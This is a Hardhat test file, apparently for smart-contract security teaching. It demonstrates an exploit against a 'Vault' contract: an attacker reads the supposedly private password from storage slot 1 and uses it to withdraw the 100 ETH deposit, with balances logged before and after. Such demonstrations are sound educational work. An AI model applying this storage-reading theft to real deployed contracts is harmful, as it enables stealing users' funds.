import { expect } from "chai";
import { ethers } from "hardhat";

describe.skip("Vault", () => {
  let deployer: any, attacker: any, vault: any;

  beforeEach(async () => {
    [deployer, attacker] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory("Vault", deployer);
    vault = await Vault.deploy(ethers.utils.formatBytes32String("myPassword"));
    await vault.deposit({ value: ethers.utils.parseEther("100") });
  });

  it("should return owner of the vault", async () => {
    expect(await vault.owner()).to.equal(deployer.address);
  });

  it("should be able to retreive private state variables", async () => {
    const initialBalanceContract = await ethers.provider.getBalance(
      vault.address
    );
    const initialBalanceAttacker = await ethers.provider.getBalance(
      attacker.address
    );

    console.log(
      "Contract initial balance: ",
      ethers.utils.formatEther(initialBalanceContract)
    );
    console.log(
      "Attacker initial balance: ",
      ethers.utils.formatEther(initialBalanceAttacker)
    );

    const pwd = await ethers.provider.getStorageAt(vault.address, 1);
    const password = ethers.utils.parseBytes32String(pwd);
    console.log("password: ", password);

    await vault.connect(attacker).withdraw(pwd);

    const finalBalanceContract = await ethers.provider.getBalance(
      vault.address
    );
    const finalBalanceAttacker = await ethers.provider.getBalance(
      attacker.address
    );

    console.log(
      "Contract final balance: ",
      ethers.utils.formatEther(finalBalanceContract)
    );
    console.log(
      "Attacker final balance: ",
      ethers.utils.formatEther(finalBalanceAttacker)
    );
  });
});
